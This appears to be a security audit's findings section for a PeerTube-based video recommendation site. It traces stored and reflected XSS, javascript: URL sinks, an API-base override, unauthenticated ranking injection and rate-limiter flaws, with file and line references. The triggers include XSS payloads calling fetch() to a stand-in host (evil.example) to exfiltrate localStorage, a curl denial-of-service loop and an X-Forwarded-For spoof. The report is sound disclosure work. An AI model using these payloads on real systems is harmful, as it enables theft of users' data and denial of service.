# Findings detail — MEDIUM and above

All line numbers verified against the working tree at audit time.

---

## F1 — Stored XSS on the channels page via unescaped `channel_url`

### Data flow

| # | File:line | What happens |
|---|---|---|
| 1 | `engine/crawler/src/channels-worker.ts:323` (`crawlInstanceChannels`) | `channelUrl: toNullableString(channel.url)` — `channel.url` is an arbitrary string from the remote instance's `/api/v1/video-channels` JSON. |
| 2 | `engine/crawler/src/channels-worker.ts:516` (`toNullableString`) | Returns the string unchanged if it is a non-empty string. No scheme, character, or length validation. |
| 3 | `engine/crawler/src/db.ts:771,780` | The `ChannelStore` prepared upsert writes it to `channels.channel_url`. |
| 4 | `engine/server/data/channels.py:106,133` (`fetch_channels`) | Selected and returned as `channel_url` in the row dict. |
| 5 | `engine/server/api/handlers/similar.py:317` (`do_GET`, `/api/channels`) | Row list returned as JSON. |
| 6 | `client/backend/server.py:186,275` (`_handle_engine_read_proxy_get` → `_proxy_engine_request`) | Engine response bytes are relayed to the browser verbatim. |
| 7 | `client/frontend/src/data/channels.ts:36` (`fetchChannelsPayload`) | Browser fetches `/api/channels`. |
| 8 | `client/frontend/src/pages/channels/index.ts:323` (`channelUrl`) | `if (row.channel_url) return row.channel_url;` |
| 9 | **`client/frontend/src/pages/channels/index.ts:277`** (`renderTable`) | `` `<a class="channel-name" href="${url}" ...>` `` assigned to `body.innerHTML` at line 259. **No `escapeHtml`.** |

Every sibling interpolation in the same template (`label`, `instance_domain`) is passed
through `escapeHtml` (`channels/index.ts:334`); `url` is the sole exception.

### Preconditions

- The attacker controls a PeerTube-API-compatible host that is present in the crawl set.
  Hosts come from `https://instances.joinpeertube.org/api/v1/instances/hosts?count=5000&healthy=true`
  (`engine/server/db/jobs/sync-whitelist.py:29`); listing is open self-registration.
- A crawl cycle must run after the payload is planted (the updater timer does this).
- Victim opens `/channels.html`. With an `onmouseover` payload a hover is needed; with
  `"><img src=x onerror=...>` no interaction is needed.

### Trigger

The attacker's instance answers `GET /api/v1/video-channels` with:

```json
{"total":1,"data":[{"id":1,"name":"news","displayName":"News",
  "url":"x\" onmouseover=\"fetch('https://evil.example/?l='+localStorage.getItem('localLikes:v1'))\" data-z=\"",
  "followersCount":9000}]}
```

Victim request: `GET https://<site>/channels.html`.

Resulting DOM:

```html
<a class="channel-name" href="x" onmouseover="fetch('https://evil.example/?l='+localStorage.getItem('localLikes:v1'))" data-z="" target="_blank" rel="noreferrer">News</a>
```

### What the attacker gets

Script execution in the site origin: the visitor's `localLikes:v1` viewing history from
`localStorage`, the ability to POST forged `/api/user-action` and
`/api/user-profile/reset` requests (both unauthenticated and same-origin), and full
control of the rendered page for phishing. No CSP is present to contain it.

### Baseline comparison

PeerTube's own Angular client binds remote URLs through the framework's URL sanitizer
and auto-escapes interpolations; a raw attribute interpolation of remote data is not
expressible without `bypassSecurityTrust*`. This project's hand-rolled escaper is the
whole defence, and it is not applied here.

---

## F2 — Reflected XSS: `?embed=` assigned to an unsandboxed iframe `src`

### Data flow

| # | File:line | What happens |
|---|---|---|
| 1 | `client/frontend/src/pages/video-page/index.ts:37,45` (module scope) | `fallback.embed = params.get("embed") ?? ""` — straight from `window.location.search`. |
| 2 | `client/frontend/src/pages/video-page/index.ts:529-536` (`resolveVideoSource`) | With no `id`/`host` params and an `embed` value that `new URL()` parses to an empty `host` (any `javascript:` URI), both `host` and `id` are `""` → returns `null`. |
| 3 | `client/frontend/src/pages/video-page/index.ts:342-344` (`fetchVideoMetadata`) | `if (!source?.host || !source.id) return null;` → metadata is `null`. |
| 4 | `client/frontend/src/pages/video-page/index.ts:88` (`loadVideo`) | `const embed = metadata?.embedUrl ?? fallback.embed;` → the attacker's string. |
| 5 | **`client/frontend/src/pages/video-page/index.ts:199-201`** (`loadVideo`) | `if (embedEl && embed) embedEl.src = embed;` — no scheme check. |
| 6 | `client/frontend/video-page.html:25-30` | `<iframe id="video-embed" title="Video player" allowfullscreen referrerpolicy="no-referrer">` — **no `sandbox` attribute**; no CSP in the document. |

### Trigger

```
GET https://<site>/video-page.html?embed=javascript:fetch('https://evil.example/?l='%2BencodeURIComponent(localStorage.getItem('localLikes:v1')))
```

No other parameter may be present that would let `resolveVideoSource` produce a host and
id (i.e. omit `id`, `host`, and a parseable `url`).

### Why it executes

Per the HTML standard's handling of `javascript:` URLs during navigation, the URL is
evaluated only when the initiator is same origin-domain with the target browsing
context's active document. The iframe starts at `about:blank`, which inherits the
parent document's origin, and the navigation is initiated by that same parent document
— so the check passes and the script runs with the site's origin. The absence of
`sandbox` (which would supply an opaque origin and, without `allow-scripts`, block
script entirely) and the absence of any CSP were both verified in source.

**Not dynamically confirmed**: no browser was available in this environment. The source
facts (unchecked assignment, no sandbox, no CSP, reachable `metadata === null` branch)
are verified; the final execution step rests on the spec.

### What the attacker gets

Same as F1, delivered by a link, with no need to touch the crawl pipeline.

### Baseline comparison

Mainstream video front-ends construct embed URLs server-side from an instance host and a
video id and never accept a full embed URL from the query string; where they do, they
allowlist `https:`.

---

## F3 — `javascript:` URLs reach `href` sinks

### Data flow (crawled-data variant)

| # | File:line | What happens |
|---|---|---|
| 1 | `engine/crawler/src/videos-worker.ts:657-658` (`toVideoRow`) | `channelUrl = toNullableString(channelRef?.url) ?? channel.channelUrl` — raw remote string. |
| 2 | `engine/crawler/src/db.ts:1146,1174` | Stored in `videos.channel_url`. |
| 3 | `engine/server/data/random_videos.py:276` (`fetch_popular_videos`) and the other candidate queries | Returned as `channel_url` in feed rows. |
| 4 | `engine/server/api/handlers/similar.py:74,77` (`STABLE_VIDEO_FIELDS`) | `channel_url` and `video_url` are both in the projection, so the raw crawled strings reach the browser in every feed and similar response. |
| 5 | `engine/server/api/handlers/video.py:260,271` (`handle_video_request`) | `/api/video` likewise returns `channelUrl: row.channel_url` unfiltered. |
| 6a | **`client/frontend/src/pages/videos/index.ts:364`** (`renderCard`) | `` `<a class="channel-link" href="${escapeHtml(channelHref)}" ...>` `` where `channelHref = channelUrl(row)` returns `row.channel_url` verbatim (`videos/index.ts:476`). |
| 6b | **`client/frontend/src/pages/video-page/index.ts:109-111`** (`loadVideo`) | `` `<a href="${escapeHtml(channelUrl)}" ...>` `` — escaped, but the scheme is never checked. |

### Data flow (URL-parameter variant)

`video-page/index.ts:44` (`fallback.channelUrl = params.get("channelUrl")`) → `:77`
(`metadata?.channelUrl || fallback.channelUrl`) → `:110` sink. Same for
`params.get("url")` → `:89` → `:204` (`originalLink.href = original`).

### Trigger

```
GET https://<site>/video-page.html?channel=Official%20Channel&channelUrl=javascript:fetch('https://evil.example/?l='%2BlocalStorage.getItem('localLikes:v1'))
```

Victim clicks the channel name under the player.

### What the attacker gets

Script execution in the site origin, gated on one click. `escapeHtml` prevents attribute
breakout, so this cannot be escalated to a no-interaction payload through this sink.

---

## F4 — `?api=` overrides the API base

### Data flow

| # | File:line | What happens |
|---|---|---|
| 1 | `client/frontend/src/data/videos.ts:29` (`parseSimilarQuery`) | `apiBase: params.get("api")`. |
| 2 | `client/frontend/src/data/api-base.ts:10-13` (`normalizeApiBase`) | Accepts any value whose first four characters are `http` — including `http://evil.example`. |
| 3 | `client/frontend/src/data/api-base.ts:18-27` (`resolveClientApiBase`) | `VITE_CLIENT_API_BASE` wins if set. `npm run dev` sets it (`client/frontend/scripts/dev.mjs:104`); the production build described in `DEPLOYMENT.md:63-71` does not, so `?api=` wins there. |
| 4 | `client/frontend/src/data/videos.ts:45-53` (`buildSimilarUrl`) | `new URL("/recommendations", apiBase)` → attacker origin. |
| 5 | **`client/frontend/src/data/videos.ts:77-86`** (`fetchSimilarVideosPayload`) | POSTs `{likes: getRandomLikes()}` to that origin and returns the parsed response as feed rows. |
| 6 | `client/frontend/src/pages/videos/index.ts:405` (`videoPageUrl`) | `if (apiParam) params.set("api", apiParam)` — the override is carried into every card link. |

Also reached by `resetUserProfileLikes` / `fetchUserProfileLikes`
(`client/frontend/src/data/user-profile.ts:20,57`) and `sendUserAction`
(`client/frontend/src/data/user-actions.ts:17`).

### Trigger

```
GET https://<site>/videos.html?api=https://evil.example
```

The attacker's server responds to `POST /recommendations` with
`{"rows":[{"title":"...","channel_url":"javascript:...","instance_domain":"evil.example", ...}]}`.

### What the attacker gets

The victim's like history (POST body), plus complete control of the content rendered on
the legitimate origin — including the `href` sinks of F3, which makes F4 a clean delivery
vehicle for F3 without needing crawler access.

---

## F5 — Unauthenticated global ranking manipulation via `/client/events/publish`

### Data flow

| # | File:line | What happens |
|---|---|---|
| 1 | `client/backend/server.py:245-250` (`do_POST`) | `/client/events/publish` routed after a rate-limit check only. No authentication exists in this service. |
| 2 | `client/backend/server.py:652-668` (`_handle_client_publish_event`) | Accepts any JSON object; fills `event_id = f"client-{uuid4()}"` when absent (defeating the ingest idempotency key) and `published_at`; forwards the whole body. |
| 3 | `client/backend/server.py:671-690` (`_publish_to_engine_bridge`) | POSTs to `{engine}/internal/events/ingest`. |
| 4 | `engine/server/api/handlers/similar.py:277-288` (`do_POST`) | Accepts the ingest when `ENGINE_INGEST_MODE == "bridge"` (the default, and what the systemd unit sets — `engine/install-engine-service.sh:181`). No caller authentication. |
| 5 | `engine/server/data/interaction_events.py:129-166` (`normalize_event_payload`) | Validates only `event_type ∈ {Like,UndoLike,Comment}` and non-empty `object.video_uuid` / `object.instance_domain`. No check that the video exists or that the actor is real. |
| 6 | `engine/server/data/interaction_events.py:92-119` (`ingest_interaction_event`) | `signal_score = MAX(0.0, signal_score + 1.0)` per `Like`; raw event row inserted permanently. |
| 7 | **`engine/server/data/random_videos.py:247`** (`fetch_popular_videos`) | `ORDER BY (v.popularity + COALESCE(sig.signal_score, 0)) DESC` — the injected value directly sets global ordering. |

### Trigger

```
POST https://<site>/client/events/publish
Content-Type: application/json

{"event_type":"Like","actor_id":"a","object":{"video_uuid":"9f9c...","instance_domain":"evil.example"}}
```

Repeat. Each call adds `+1.0`. `v.popularity` is
`(views + 2*likes) / (1 + age_days/30)` (`engine/server/data/popularity.py:24`), which
for a year-old video with 1 000 views is roughly 77 — so a few thousand calls dominate
the ordering.

### What the attacker gets

Control of the `popular` candidate layer for every visitor of the deployment — 10 % of
the home mix and 20–40 % of the guest mix
(`engine/server/api/server_config.py:56,142,251`) — plus unbounded growth of
`interaction_raw_events`, which has no retention policy.

### Baseline comparison

Comparable recommendation backends accept engagement signals only from an authenticated
session or a server-side bridge with a shared secret, deduplicate per (user, item), and
cap per-item contribution. None of the three controls is present here.

---

## F6 — Rate limiter keys on the wrong address

### Data flow

| # | File:line | What happens |
|---|---|---|
| 1 | `client/backend/server.py:135-147` (`_get_client_ip`) | Parses `X-Forwarded-For` / `X-Real-IP` — evidence that a reverse proxy is the intended deployment. Used for logging only. |
| 2 | **`client/backend/server.py:253-257`** (`_rate_limit_check`) | `ip = self.client_address[0]` — the TCP peer. Behind a proxy that is one constant address for all users. |
| 3 | `client/backend/lib/http_utils.py:110-126` (`RateLimiter.allow`) | Single deque per `f"{ip}:{path}"` key, 90 requests / 60 s (`client/backend/server.py:40-41`). |
| 4 | `engine/server/api/handlers/similar.py:355-362` (`_rate_limit_check`) | Mirror-image defect: keys on `_get_client_ip()`, which prefers the **client-supplied** `X-Forwarded-For`, so the limiter is bypassed by varying that header. |

### Trigger

Against the Client backend behind a proxy:

```
for i in $(seq 1 90); do curl -s -o /dev/null -X POST https://<site>/recommendations -d '{}' -H 'content-type: application/json'; done
```

Every other visitor then receives `{"error":"Rate limit exceeded"}` with HTTP 429 for the
remainder of the window.

Against the Engine (if reachable): add `-H "X-Forwarded-For: 1.2.3.$RANDOM"` to each
request and the limiter never triggers.

### What the attacker gets

A one-line denial of service against the feed for all users of a proxied deployment, and
removal of the only rate control standing in front of F5 and F8.
